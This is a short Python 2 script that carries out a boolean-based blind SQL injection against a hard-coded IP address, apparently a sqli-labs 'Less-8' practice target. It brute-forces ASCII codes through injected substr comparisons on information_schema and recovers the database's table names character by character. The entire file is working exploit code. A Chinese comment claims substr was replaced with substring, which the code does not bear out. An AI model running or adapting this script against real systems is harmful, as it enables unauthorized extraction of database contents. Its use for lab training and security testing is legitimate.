# -*- coding:utf8 -*-
import requests
url = 'http://47.104.232.176:9002/Less-8?id=1%27'
payload = 'and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=' \
          'database()%20limit%20{t},1),{w},1))={A}%20--%20k'
# 我把上面的substr改成了substring按理说mysql里substring和substr是一样的但是如果出错了记得改回substr
list1 = [64, 94, 96, 124, 176, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 173, 175, 95, 65, 66, 67, 68, 69, 70, 71,
         72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103,
         104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 44]
str1 = "You are in..........."
tables1 = ''
tables2 = ''
tables3 = ''
tables4 = ''
for i in range(0, 4):   #这里要视情况而定,表的数量不定
    for j in range(1, 10):
        for s in list1:
            p = payload.format(t=i, w=j, A=s)
            html = requests.get(url+p)
            if "You" in html.text:
                if i == 0:
                    tables1 += chr(s)
                    print (u"正在对比第1个表,", u"第", j, u"个字符",tables1)
                elif i == 1:
                    tables2 += chr(s)
                    print (u"正在对比第2个表,", u"第", j, u"个字符", tables2)
                elif i == 2:
                    tables3 += chr(s)
                    print (u"正在对比第3个表,", u"第", j, u"个字符", tables3)
                elif i == 3:
                    tables4 += chr(s)
                    print (u"正在对比第4个表,", u"第", j, u"个字符", tables4)
                    break
print ('tables1-->', tables1)
print ('tables2-->', tables2)
print ('tables3-->', tables3)
print ('tables4-->', tables4)
a = raw_input()
